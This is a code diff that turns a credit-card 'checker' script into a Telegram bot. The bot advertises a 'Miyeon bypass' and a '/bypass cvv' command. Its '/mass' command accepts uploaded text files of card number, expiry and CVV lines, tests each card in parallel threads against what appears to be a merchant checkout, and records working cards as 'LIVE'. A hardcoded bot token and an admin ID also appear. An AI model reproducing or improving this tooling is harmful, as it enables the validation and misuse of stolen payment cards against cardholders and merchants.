@@ -9,10 +9,13 @@ import re
 import concurrent.futures
 import csv
 import telegram
+import logging
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 import json
+import telebot
 import rich
 import threading
+import time
 
 try:
     import requests, os, rich, datetime, time
@@ -37,6 +40,8 @@ entry = """\n_summary_
 
 
 rich.print(entry)
+
+bot_token = '6307901992:AAFHyflCkmFYt21-58w190825Io7mHs7AV8'
 
 
 #SSL ERROR FIXED
@@ -98,18 +103,121 @@ session_id = generate_guid()
 
 # Example usage:
 
+TOKEN = "6307901992:AAFHyflCkmFYt21-58w190825Io7mHs7AV8"
+
+# Initialize the Telegram bot
+bot = telebot.TeleBot(TOKEN)
+
+YOUR_ADMIN_USER_ID = '5911292485'
+# Function to check if a user is authorized
+def is_authorized(user_id):
+    with open("authorize.txt", "r") as file:
+        authorized_users = file.read().splitlines()
+    return str(user_id) in authorized_users
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    # Check if the user is authorized
+    user_id = message.from_user.id
+    
+    if is_authorized(user_id):
+        bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝘁𝗵𝗲 𝗠𝗶𝘆𝗲𝗼𝗻 𝗯𝘆𝗽𝗮𝘀𝘀 𝗯𝗼𝘁! 🤗 𝗯𝘆 @itz_shinobu_kocho 𝘂𝘀𝗲 /𝗰𝗺𝗱𝘀 𝘁𝗼 𝘀𝗲𝗲 𝘁𝗵𝗲 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀.")
+    else:
+        bot.reply_to(message, "You are not authorized ❌")
+    
+# Command handler for the /cmds command
+@bot.message_handler(commands=['cmds'])
+def cmds(message):
+    bot.reply_to(message, "Available commands:\n"
+                         "/start - Start the bot\n"
+                         "/cmds - List available commands\n"
+                         "/bypass - Bypass cvv")
+    
+# Auth command handler for admins to authorize users
+@bot.message_handler(commands=['auth'])
+def auth(message):
+    if message.from_user.id == 5911292485:
+        try:
+            user_id = int(message.text.split()[1])
+            with open("authorize.txt", "a") as file:
+                file.write(str(user_id) + "\n")
+            bot.reply_to(message, f"{user_id} has been authorized ✅")
+        except ValueError:
+            bot.reply_to(message, "Invalid user ID format. Please use /auth user_id.")
+    else:
+        bot.reply_to(message, "You are not authorized to use this command.")
 
 
+def edit_and_send_message_with_delay(chat_id, message_id, msg):
+    bot.edit_message_text(
+        chat_id=chat_id,
+        message_id=message_id,
+        text=msg
+    )
+    time.sleep(5)
 
+def download_file(file_path):
+    file_url = f'https://api.telegram.org/file/bot{bot_token}/{file_path}'
+    response = requests.get(file_url)
+    file_name = file_path.split('/')[-1]
+    
+    # Get the directory of the script and create the full file path
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    full_file_path = os.path.join(script_dir, file_name)
+    
+    with open(full_file_path, 'wb') as file:
+        file.write(response.content)
+    
+    return full_file_path
 
+@bot.message_handler(commands=['mass'])
+def mass(message):
+    global file_path
+    if message.reply_to_message and message.reply_to_message.document:
+        if message.reply_to_message.document.mime_type == 'text/plain':
+            file_info = bot.get_file(message.reply_to_message.document.file_id)
+            file_path = download_file(file_info.file_path)
+            start_msg = bot.reply_to(message, 'Your request has been received ✅')
+            
+            edited_messages = [
+                '[🔴] File uploaded',
+                '[🟢] Connected to SITE'
+            ]
+            for msg in edited_messages:
+                edit_and_send_message_with_delay(start_msg.chat.id, start_msg.message_id, msg)
+            
+            process_cards(message)
+        else:
+            bot.reply_to(message, 'Please upload a text file with the extension .txt.')
+    else:
+        bot.reply_to(message, 'Please reply to a message that contains a text file.')
+
+# Initialize the file_path variable to None
+file_path = None
+
+def process_cards(message):
+    global file_path
+    try:
+        if file_path is not None:
+            with open(file_path, 'r') as file:
+                for line in file:
+                    cc_data = line.strip().split('|')
+                    if len(cc_data) == 4:
+                        threading.Thread(target=process_single_cc, args=(cc_data,)).start()
+                        # Add a delay between starting threads (adjust as needed)
+                        time.sleep(2)
+            bot.send_message(message.chat.id, 'Processing complete.')
+        else:
+            bot.send_message(message.chat.id, 'File not found. Please upload a text file.')
+    except Exception as e:
+        bot.send_message(message.chat.id, f'An error occurred: {str(e)}')
 
 
 bin_info_dict = {}
 
 
-
-
-def cc_check(ccn, month, year, cvv):
+def process_single_cc(cc_data):
+    ccn, month, year, cvv = cc_data
     # Initialize the bin_info_dict as an empty dictionary
     bin_info_dict = {}
     print(ccn)
@@ -132,10 +240,7 @@ def cc_check(ccn, month, year, cvv):
                 'Country': row['country']
             }
             bin_info_dict[row['number'][:6]] = bin_info
-
-
-        
-            
+          
     s = requests.Session()
     start_time = time.time()
 
@@ -436,6 +541,20 @@ Content-Disposition: form-data; name="variation_id"
         for live_cc in live:
             with open("live.txt","a",encoding="utf-8")as dead_ccs:
                 dead_ccs.write(f"🟢 LIVE : {ccnd} {response_2.text}\n\n")
+                
+    elif "The card's security code is invalid." in response_2.text:
+        live = []
+        ccnd = f"{ccn}|{month}|{year}|{cvv}".strip()
+        result = "security code is invalid."
+        send = {
+    'condition': True  # Set the condition to True if you want to send the message
+}
+        rich.print(f"\n LIVE : {ccnd} {response_2.text}\n")
+        live.append(ccnd)
+        
+        for live_cc in live:
+            with open("live.txt","a",encoding="utf-8")as dead_ccs:
+                dead_ccs.write(f"🟢 LIVE : {ccnd} {response_2.text}\n\n")
 
 
     elif "security_code_incorrect" in response_2.text:
@@ -462,20 +581,6 @@ Content-Disposition: form-data; name="variation_id"
     'condition': True  # Set the condition to True if you want to send the message
 }
 
-        rich.print(f"\n LIVE : {ccnd} {response_2.text}\n")
-        live.append(ccnd)
-        
-        for live_cc in live:
-            with open("live.txt","a",encoding="utf-8")as dead_ccs:
-                dead_ccs.write(f"🟢 LIVE : {ccnd} {response_2.text}\n\n")
-                
-    elif "The card's security code is invalid." in response_2.text:
-        live = []
-        ccnd = f"{ccn}|{month}|{year}|{cvv}".strip()
-        result = "security code is invalid."
-        send = {
-    'condition': True  # Set the condition to True if you want to send the message
-}
         rich.print(f"\n LIVE : {ccnd} {response_2.text}\n")
         live.append(ccnd)
         
@@ -780,53 +885,9 @@ Content-Disposition: form-data; name="variation_id"
             print(f"An error occurred: {str(e)}")
         pass
 
-
-def worker(work_queue):
-    while True:
-        try:
-            ccn, month, year, cvv = work_queue.get(timeout=1)
-            cc_check(ccn, month, year, cvv)
-            work_queue.task_done()
-        except queue.Empty:
-            break
-
-def main():
-    while True:
-        # Create a queue to hold unique credit card data
-        unique_cc_data = set()
-
-        # Open and process the cc.txt file
-        with open("cc.txt") as cc_file:
-            for line in cc_file:
-                cc_data = line.strip().split('|')
-                if len(cc_data) == 4:
-                    ccn, month, year, cvv = cc_data
-                    unique_cc_data.add((ccn, month, year, cvv))
-                else:
-                    print("Invalid cc format")
-
-        # Create a queue to hold the work items
-        work_queue = queue.Queue()
-
-        # Populate the work queue with unique credit card data
-        for cc_data in unique_cc_data:
-            work_queue.put(cc_data)
-
-        # Create 10 worker threads
-        threads = []
-        for _ in range(10):
-            thread = threading.Thread(target=worker, args=(work_queue,))
-            thread.start()
-            threads.append(thread)
-
-        # Wait for all worker threads to finish
-        for thread in threads:
-            thread.join()
-
-        # Ask the user whether to restart or exit
-        choice = input("Press 1 to restart or 2 to exit: ")
-        if choice == "2":
-            break
-
-if __name__ == "__main__":
-    main()
+if __name__ == '__main__':
+    print("Starting bot polling loop...")
+    try:
+        bot.polling()
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
